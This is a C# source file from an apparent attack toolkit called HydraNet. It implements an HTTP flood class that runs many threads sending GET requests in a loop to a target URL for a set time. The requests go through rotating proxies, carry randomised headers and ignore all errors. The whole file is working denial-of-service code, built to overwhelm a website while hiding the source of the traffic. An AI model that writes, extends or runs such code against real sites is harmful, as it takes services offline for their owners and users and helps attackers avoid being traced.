namespace HydraNet.Attacks;

using System.Net;
using HydraNet.Network;
using HydraNet.Utils;

public sealed class HttpFlood
{
    private readonly ProxyPool _proxyPool;
    private readonly HeaderGenerator _headers;
    private int _requestCount;

    public int TotalRequests => _requestCount;

    public HttpFlood(ProxyPool proxyPool)
    {
        _proxyPool = proxyPool;
        _headers = new HeaderGenerator();
    }

    public async Task ExecuteAsync(string targetUrl, int threads, int durationSeconds, CancellationToken ct)
    {
        var endTime = DateTime.UtcNow.AddSeconds(durationSeconds);
        var tasks = new List<Task>();

        for (int i = 0; i < threads; i++)
        {
            tasks.Add(FloodWorkerAsync(targetUrl, endTime, ct));
        }

        await Task.WhenAll(tasks);
    }

    private async Task FloodWorkerAsync(string url, DateTime endTime, CancellationToken ct)
    {
        using var handler = new HttpClientHandler();
        var proxy = _proxyPool.GetNext();
        if (proxy is not null)
        {
            handler.Proxy = new WebProxy(proxy);
        }

        using var client = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(5) };

        while (DateTime.UtcNow < endTime && !ct.IsCancellationRequested)
        {
            try
            {
                var request = new HttpRequestMessage(HttpMethod.Get, url);
                foreach (var header in _headers.Generate())
                {
                    request.Headers.TryAddWithoutValidation(header.Key, header.Value);
                }
                await client.SendAsync(request, ct);
                Interlocked.Increment(ref _requestCount);
            }
            catch
            {
            }
        }
    }
}
